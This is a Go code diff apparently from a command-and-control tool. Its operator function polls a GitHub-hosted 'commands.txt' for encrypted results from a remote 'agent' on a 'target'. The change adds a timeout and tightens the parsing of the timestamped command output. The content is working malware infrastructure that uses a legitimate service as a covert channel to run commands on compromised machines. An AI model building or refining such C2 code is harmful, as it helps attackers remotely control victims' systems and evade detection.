@@ -79,9 +79,15 @@ func main() {
 
 func waitForResult(oldEncryptedPayload string, sentTimestamp int64, key string) {
 	secsWaited := 0
+	timeout := 90
+
 	for {
 		time.Sleep(5 * time.Second)
 		secsWaited += 5
+		if secsWaited >= timeout {
+			fmt.Printf("%s[-] Target is unresponsive. Agent might be offline.\n", Red)
+			return
+		}
 
 		content, err := github.ReadFile("commands.txt")
 		if err != nil {
@@ -102,22 +108,20 @@ func waitForResult(oldEncryptedPayload string, sentTimestamp int64, key string) 
 		}
 
 		// unencode the response format (timestamp|output)
-		parts := strings.SplitN(decrypted, "|", 2)
-		if len(parts) != 2 {
+		timestampStr, output, found := strings.Cut(decrypted, "|")
+		if !found {
 			fmt.Println("[-] Invalid response format")
 			continue
 		}
 
-		receivedTimestamp, _ := strconv.ParseInt(parts[0], 10, 64)
-
-		if receivedTimestamp == sentTimestamp {
-			fmt.Println(parts[1])
-			return
+		receivedTimestamp, err := strconv.ParseInt(timestampStr, 10, 64)
+		if err != nil {
+			fmt.Println("[-] Invalid response format")
+			continue
 		}
 
-		secsWaited += 5
-		if secsWaited >= 60 {
-			fmt.Printf("%sTarget is unresponsive. Agent might be offline.\n", Red)
+		if receivedTimestamp == sentTimestamp {
+			fmt.Println(output)
 			return
 		}
 	}
